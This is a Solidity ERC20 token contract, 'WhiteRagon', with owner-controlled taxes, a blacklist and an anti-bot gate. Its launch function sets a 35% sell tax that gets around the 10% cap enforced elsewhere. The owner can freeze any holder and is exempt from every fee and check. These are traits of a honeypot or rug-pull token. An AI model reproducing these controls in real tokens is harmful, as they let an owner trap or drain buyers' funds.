// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./interfaces/IUniswapV2.sol";

contract WhiteRagon is ERC20, ERC20Burnable, Ownable {
    using SafeMath for uint;

    uint256 private totalTokens;
    uint256 private valueAntiBot;
    uint256 public startTime;
    uint256 public endTime;

    uint16 public sT = 0;
    uint16 public bT = 0; // 15% is default for anti bot

    bool public isAntiBotEnabled = false;
    bool public isTaxEnabled = false;

    mapping(address => bool) private blackList;

    address public buyBackWallet;
    address public swapPair;
    address public operator;

    IERC20 private trackToken;
    IUniswapV2Router public swapRouter;

    constructor() ERC20("WhiteRagon", "WRG") {
        startTime = block.timestamp;
        operator = owner();
        totalTokens = 420690000 * 10 ** 6 * 10 ** uint256(decimals());

        swapRouter = IUniswapV2Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        swapPair = IUniswapV2Factory(swapRouter.factory()).createPair(
            address(this),
            swapRouter.WETH()
        );

        _mint(owner(), totalTokens);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override(ERC20) _antiBot(from, to) {
        super._beforeTokenTransfer(from, to, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (isTaxEnabled == true && tx.origin != owner()) {
            if (recipient == swapPair) {
                uint256 fee = caculateFee(amount, sT);
                super._transfer(sender, buyBackWallet, fee);
                amount = amount.sub(fee);
            } else if (sender == swapPair) {
                uint256 balanceUser = balanceOf(sender);
                require(
                    amount < balanceUser.mul(9999).div(10000),
                    "Anti Bot: Max 99.99% of balance"
                );
                uint256 fee = caculateFee(amount, bT);
                super._transfer(sender, buyBackWallet, fee);
                amount = amount.sub(fee);
            }
        }
        super._transfer(sender, recipient, amount);
    }

    function getBurnedAmountTotal() external view returns (uint256 _amount) {
        return totalTokens.sub(totalSupply());
    }

    /**
     * @dev Enable anti bot
     * @param _trackToken: The token to track.
     * @param _buyBackWallet: The buy back wallet.
     * @param _valueAntiBot: The recipient must have a token balance greater than _valueAntiBot.
     * @param _endTime: The time to end anti bot.
     */
    function launch(
        address _trackToken,
        address _buyBackWallet,
        uint256 _endTime,
        uint256 _valueAntiBot
    ) external onlyOwner {
        require(isAntiBotEnabled == false, "Anti Bot: Already enabled.");
        // set anti bot value, start time, end time, track token and to the moon
        // this function can only be called once

        // Antibot
        isAntiBotEnabled = true;
        trackToken = IERC20(_trackToken);
        endTime = _endTime;
        valueAntiBot = _valueAntiBot;

        // Tax
        isTaxEnabled = true;
        sT = 3500;
        bT = 1000;

        // Buy-Back Wallet
        buyBackWallet = _buyBackWallet;
    }

    /**
     * @dev Enable tax
     */
    function toggleTax(bool isTax) external onlyOwner {
        isTaxEnabled = isTax;
    }

    /**
     * @dev Set black list address
     * @param _blackList: Array of blacklist address.
     */
    function addBlacklist(address[] memory _blackList) external onlyOwner {
        for (uint256 i = 0; i < _blackList.length; i++) {
            blackList[_blackList[i]] = true;
        }
    }

    /**
     * @dev Remove black list address
     * @param _blackList: The black list address.
     */
    function removeBlacklist(address[] memory _blackList) external onlyOwner {
        for (uint256 i = 0; i < _blackList.length; i++) {
            blackList[_blackList[i]] = false;
        }
    }

    /**
     * @dev Set tax
     * @param _sT: The sell tax.
     * @param _bT: The buy tax.
     */
    function setupTax(uint16 _sT, uint16 _bT) external onlyOwner {
        require(_sT <= 1000, "Sell fee must be less than 10%");
        require(_bT <= 1000, "Buy fee must be less than 10%");
        sT = _sT;
        bT = _bT;
    }

    /**
     * @dev Set buy back wallet
     * @param _buyBackWallet: The buy back wallet address.
     */
    function setBuyBackWallet(address _buyBackWallet) external onlyOwner {
        buyBackWallet = _buyBackWallet;
    }

    /**
     * @dev calculate fee
     * @param amount: The amount.
     * @param percent: The percent.
     */
    function caculateFee(
        uint256 amount,
        uint16 percent
    ) public pure returns (uint256) {
        uint256 fee = amount.mul(percent).div(10000);
        return fee;
    }

    /**
     * @dev Anti bot modifier after launch
     * @param from: The sender address.
     * @param to: The recipient address.
     */
    modifier _antiBot(address from, address to) {
        require(blackList[from] == false, "Anti Bot: Blacklisted address.");
        if (from == owner() || to == owner() || tx.origin == owner()) {
            _;
        } else {
            if (block.timestamp > startTime && block.timestamp < endTime) {
                uint256 balanceAntiBot = trackToken.balanceOf(tx.origin);
                require(balanceAntiBot >= valueAntiBot);
            }
            _;
        }
    }
}